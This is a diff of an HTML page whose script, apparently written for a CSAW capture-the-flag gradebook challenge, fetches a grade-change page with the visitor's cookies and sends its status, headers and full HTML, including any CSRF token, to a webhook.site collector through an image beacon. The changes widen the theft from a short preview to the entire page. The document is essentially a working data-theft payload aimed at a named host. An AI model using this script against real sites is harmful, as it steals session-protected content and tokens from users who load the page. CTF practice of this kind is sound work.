@@ -3,32 +3,37 @@
 <body>
     <script>
         function exfiltrate(data) {
-            // Encode data in URL and use img tag (allowed by CSP: img-src *)
             const params = new URLSearchParams();
             params.append('data', JSON.stringify(data));
             new Image().src = `https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb?${params.toString()}`;
         }
 
-        // Try to fetch the grade-change page
+        // Fetch the grade-change page and get entire HTML
         fetch('https://gradebook-app.ctf.csaw.io/grade-change', {
-            credentials: 'include'
+            credentials: 'include',
+            mode: 'same-origin'
         })
         .then(response => {
+            // Send response metadata first
             exfiltrate({
-                type: 'response_headers',
+                type: 'response_metadata',
                 status: response.status,
                 statusText: response.statusText,
                 url: response.url,
-                redirected: response.redirected
+                redirected: response.redirected,
+                headers: Object.fromEntries(response.headers.entries())
             });
+            
             return response.text();
         })
         .then(html => {
+            // Send the ENTIRE HTML content
             exfiltrate({
-                type: 'success',
-                html_length: html.length,
-                html_preview: html.substring(0, 200),
-                has_csrf: html.includes('csrf_token')
+                type: 'full_html',
+                html: html,
+                length: html.length,
+                has_csrf: html.includes('csrf_token'),
+                timestamp: new Date().toISOString()
             });
         })
         .catch(error => {
@@ -36,7 +41,8 @@
                 type: 'error',
                 error: error.toString(),
                 error_name: error.name,
-                error_message: error.message
+                error_message: error.message,
+                timestamp: new Date().toISOString()
             });
         });
     </script>
